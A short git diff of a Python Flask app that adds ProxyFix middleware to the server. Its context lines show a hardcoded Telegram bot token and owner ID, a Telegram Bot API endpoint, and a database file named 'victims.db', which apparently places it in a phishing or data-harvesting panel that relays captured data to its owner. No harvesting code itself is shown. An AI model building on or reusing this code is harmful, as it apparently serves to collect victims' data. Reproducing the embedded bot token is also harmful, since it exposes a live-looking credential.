@@ -1,5 +1,6 @@
 import os, sys, time, html, secrets, re, base64, sqlite3
 from flask import Flask, request, redirect, render_template_string
+from werkzeug.middleware.proxy_fix import ProxyFix
 import requests
 
 BOT_TOKEN = "8452544570:AAHZqiuOuR4yjklOcRwwoKeg4HFxorNOzdo"
@@ -7,6 +8,8 @@ OWNER_ID  = 8604564099
 
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 app = Flask(__name__)
+app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
+
 DB_PATH = "victims.db"
 
 def init_db():
